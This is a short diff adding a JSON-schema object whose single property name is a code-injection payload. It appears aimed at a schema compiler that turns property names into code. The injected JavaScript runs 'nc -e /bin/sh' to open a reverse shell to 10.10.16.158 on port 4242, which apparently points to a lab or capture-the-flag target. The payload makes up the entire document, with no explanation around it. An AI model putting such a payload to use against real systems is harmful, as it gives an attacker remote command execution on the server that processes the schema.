@@ -1,0 +1,9 @@
+{
+  type: 'object',
+  properties: {
+    'x[console.log(process.mainModule.require('child_process').execSync('nc -e /bin/sh 10.10.16.158 4242'))]': {
+      required: true,
+      type:'string'
+    }
+  }
+}
